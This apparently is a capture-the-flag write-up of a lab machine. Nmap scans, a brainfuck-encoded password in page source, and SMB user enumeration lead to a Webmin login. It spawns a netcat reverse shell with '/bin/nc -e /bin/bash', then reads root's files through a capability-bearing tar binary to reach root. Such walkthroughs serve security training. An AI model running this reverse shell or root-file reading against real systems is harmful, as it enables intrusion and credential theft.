first enumeration with nmap

```shell
# Nmap 7.94 scan initiated Sat Aug 26 16:57:19 2023 as: nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 192.168.224.238
Nmap scan report for 192.168.224.238
Host is up (0.14s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
20000/tcp open  dnp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Aug 26 16:58:40 2023 -- 1 IP address (1 host up) scanned in 81.77 seconds
```
first run full port scan to know what ports are open, let's run nmap default script to know what services are running on those port.

```shell
# Nmap 7.94 scan initiated Sat Aug 26 17:01:43 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 80,139,445,10000,20000 -Pn 192.168.224.238
Nmap scan report for 192.168.224.238
Host is up (0.22s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-server-header: MiniServ/1.981
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-08-26T16:01:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 26 17:02:28 2023 -- 1 IP address (1 host up) scanned in 45.39 seconds
```
cool we now know what services are running on those ports. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9245b006-23fa-4d0d-a8be-0ab7dd83d64b)

Noticed a web server running on port 80, opening it on a browser, we got a default apache webpage. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b292a80-7345-4800-802b-9d03a653e7c8)

checking the source code, we can see a text encoded in brainfuck encryption.

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```
let's decode it 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/bb49abe6-0a9c-4949-9412-05621e589d17)

decoded the text using [decode](https://www.dcode.fr/brainfuck-language). we got `.2uqPEfj3D<P'a-3`. let's enumerate further. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ef6290c5-6d83-4a4e-adfc-977c1a084617)

noticed another web server on port `10000` opening it on a browser, we got redirected to a webmin login page, remember we got a potential password earlier, tried to login admin and using the decoded text as password, it failed.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/31f08e59-b981-4981-8ccc-6b4b63cb08e9)

another webmin server is running on port `20000` tried to login using the same creds as earlier, failed. 🤔 let's enumerate harder. let shoot `enum4linux` to get available users so as to do a username enumeration on the login page.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7605fb0f-3a76-4d09-ac91-1f707b5bc850)

running `enum4linux -a $IP` we got to see a unix user `cyber`. let's try to login the webmin server using this username and the potential password from earlier.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a51d6dbe-d6a6-4bab-b102-2f39502a0418)

Bankai!!! 🔥 we are able to login to the webmin server on port `20000` using cred `cyber:.2uqPEfj3D<P'a-3`. let's play around and find a way to get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a5ca8b68-84db-4d84-8b35-547d1f326b16)

clicking on the terminal button, we got into a terminal we can run shell commands on. let's spawn a reverse shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1faffc8d-b063-474f-8fc4-dee4e356b23f)

spawned a reverse shell using `/bin/nc -e /bin/bash $IP $port`


## Privilege Escalation


![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fdd897c7-bfda-4772-8c2d-26b446b6a0cf)

In the home directory of user `cyber` we can see a binary `tar`. 🤔 it is not an suid, let's see what we can do with this. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c77c0f4d-0e6c-4f0b-99e7-0c22aced217b)

checking gtfobins, we can see that we can read files. 🤔 hmmmmmm

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ccd8a067-5d82-47f7-9c43-bd8059e3232c)

we could read root files without being root using this binary. 🤔 let's try read root `.bash_history` file and see if we can loot anything.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5ee559d4-51e9-436a-b0ab-38e8dfe14f58)

There's a file named `.old_pass.bak` and it is only owned by root, let's check it content since we can read root files. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fbcd7429-d44c-4012-8f79-85369b77b8ac)

checking the content of the file, we got a password, su root using the password and boom we are root.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e4cfbb94-e5af-4214-9f32-26314636866d)

We broke out of the shell 😜 Interesting yeah? 
